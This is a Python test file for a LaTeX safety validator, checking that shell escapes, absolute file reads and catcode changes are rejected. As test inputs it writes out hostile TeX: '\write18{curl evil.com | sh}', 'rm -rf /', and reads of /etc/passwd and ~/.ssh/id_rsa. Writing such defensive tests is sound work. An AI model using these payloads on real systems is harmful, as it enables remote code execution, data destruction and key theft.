"""Tests for LaTeX safety validator."""
import tempfile
from pathlib import Path

from src.utils.latex_safety import validate_tex_file


def _write_tex(content: str) -> str:
    """Write content to a temp .tex file, return path."""
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".tex", delete=False)
    f.write(content)
    f.close()
    return f.name


def test_safe_tex_passes():
    path = _write_tex(r"""
\documentclass{article}
\begin{document}
Hello world
\end{document}
""")
    result = validate_tex_file(path)
    assert result["safe"]
    assert len(result["violations"]) == 0


def test_write18_blocked():
    path = _write_tex(r"\write18{curl evil.com | sh}")
    result = validate_tex_file(path)
    assert not result["safe"]
    assert any("shell escape" in v for v in result["violations"])


def test_immediate_write_blocked():
    path = _write_tex(r"\immediate\write18{rm -rf /}")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_absolute_input_blocked():
    path = _write_tex(r"\input{/etc/passwd}")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_openin_blocked():
    path = _write_tex(r"\openin\myfile=~/.ssh/id_rsa")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_catcode_blocked():
    path = _write_tex(r"\catcode`\@=11")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_relative_input_allowed():
    path = _write_tex(r"\input{header.tex}")
    result = validate_tex_file(path)
    assert result["safe"]  # Relative paths are fine


def test_missing_file():
    result = validate_tex_file("/nonexistent/file.tex")
    assert not result["safe"]


if __name__ == "__main__":
    for name, func in list(globals().items()):
        if name.startswith("test_") and callable(func):
            try:
                func()
                print(f"  PASS: {name}")
            except AssertionError as e:
                print(f"  FAIL: {name} — {e}")
    print("Done.")
